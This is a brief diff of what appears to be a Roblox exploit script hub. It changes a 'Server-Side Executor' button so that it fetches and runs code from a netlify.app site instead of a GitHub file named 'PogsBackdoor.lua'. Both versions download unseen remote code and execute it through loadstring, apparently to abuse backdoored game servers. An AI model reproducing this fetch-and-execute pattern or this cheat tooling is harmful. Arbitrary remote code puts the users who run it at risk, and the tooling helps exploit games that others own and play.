@@ -96,7 +96,7 @@ Tabs.Scripts:CreateButton({
 Tabs.Scripts:CreateButton({
     Name = "starlight Server-Side Executor",
     Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/TempUserIdk18/robloxscripts/refs/heads/main/PogsBackdoor.lua"))()
+        loadstring(game:HttpGetAsync("https://starlightrbx.netlify.app/"))()
     end
 })
 
